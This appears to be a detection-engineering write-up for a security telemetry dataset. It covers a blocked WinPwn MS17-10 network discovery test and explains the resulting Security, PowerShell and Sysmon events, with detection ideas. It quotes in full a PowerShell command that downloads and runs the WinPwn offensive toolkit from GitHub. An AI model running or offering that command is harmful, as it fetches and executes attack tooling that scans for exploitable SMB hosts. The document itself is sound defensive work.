# T1046-6: Network Service Discovery — WinPwn - MS17-10

## Technique Context

T1046 Network Service Discovery involves adversaries attempting to get a listing of services running on remote hosts and local network infrastructure. This technique is fundamental to lateral movement and privilege escalation campaigns. Attackers use it to identify vulnerable services that can be exploited, such as unpatched SMB services targeted by EternalBlue (MS17-010). The WinPwn framework, used in this test, is a PowerShell-based post-exploitation toolkit that includes modules for network reconnaissance and vulnerability scanning. The MS17-10 module specifically targets the SMBv1 vulnerability (CVE-2017-0144) that enables the EternalBlue exploit. Detection engineers focus on PowerShell-based network scanning activities, suspicious web requests for offensive tools, and process chains involving network discovery utilities.

## What This Dataset Contains

This dataset captures a WinPwn MS17-10 network discovery attempt that was blocked by Windows Defender. The Security channel shows the process chain starting with a PowerShell process (PID 19864) executing `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/WinPwn/121dcee26a7aca368821563cbe92b2b5638c5773/WinPwn.ps1')MS17-10 -noninteractive -consoleoutput}`. The PowerShell channel captures the download attempt via `New-Object net.webclient` and the subsequent blocking by AMSI with the error "This script contains malicious content and has been blocked by your antivirus software" (EID 4100). Sysmon provides comprehensive process telemetry including ProcessCreate events for whoami.exe (PID 19396) and the child PowerShell process (PID 19004), along with DNS resolution for raw.githubusercontent.com. The dataset includes multiple Sysmon EID 7 events showing .NET runtime and Windows Defender DLL loads, EID 10 process access events between PowerShell processes, and EID 17 named pipe creation events for PowerShell hosting.

## What This Dataset Does Not Contain

The dataset lacks the actual network scanning activity that would occur if WinPwn's MS17-10 module had executed successfully. Windows Defender's real-time protection blocked the malicious script download before any SMB enumeration, port scanning, or vulnerability probing could take place. There are no network connection events (Sysmon EID 3) showing connections to target hosts on port 445/SMB, no additional process creation events for network utilities like nmap or built-in tools, and no file system artifacts from successful WinPwn deployment. The Security channel shows normal process termination (exit status 0x0) rather than access denied errors, indicating the processes completed normally after the blocking occurred. The PowerShell script block logging shows only the initial download attempt and AMSI blocking, not the network discovery payloads that would have been executed.

## Assessment

This dataset provides excellent telemetry for detecting attempted deployment of PowerShell-based offensive frameworks but limited visibility into actual network service discovery behaviors. The combination of Security 4688 command-line logging, PowerShell script block logging, and Sysmon process monitoring creates multiple detection layers for this attack pattern. The DNS query for raw.githubusercontent.com and the characteristic WinPwn command line structure provide strong indicators of compromise. However, defenders seeking to understand post-exploitation network discovery techniques will find limited value since Defender prevented execution. The dataset demonstrates effective endpoint protection but may not fully represent the network scanning patterns that would occur in environments with weaker security controls.

## Detection Opportunities Present in This Data

1. **PowerShell Web Download Patterns**: Detect `New-Object net.webclient` combined with `downloadstring` from GitHub raw content URLs, particularly from known offensive tool repositories.

2. **WinPwn Framework Indicators**: Monitor for command lines containing "WinPwn.ps1" downloads or execution with parameters like "MS17-10", "-noninteractive", and "-consoleoutput".

3. **AMSI Malware Blocking Events**: Alert on PowerShell EID 4100 events with "ScriptContainedMaliciousContent" error text indicating blocked malicious content execution.

4. **Suspicious GitHub Raw Content Access**: Flag DNS queries and web requests to raw.githubusercontent.com from PowerShell processes, especially for repositories containing offensive tools.

5. **PowerShell Process Chains**: Detect parent-child PowerShell processes where the child process command line contains encoded commands or suspicious web download operations.

6. **Named Pipe Creation by PowerShell**: Monitor Sysmon EID 17 events for PowerShell processes creating pipes with patterns like "PSHost.*powershell", which may indicate advanced PowerShell hosting scenarios.

7. **Windows Defender DLL Loading Anomalies**: Correlate Sysmon EID 7 events showing MpOAV.dll and MpClient.dll loads in PowerShell processes with subsequent blocking events to identify attempted malware execution.
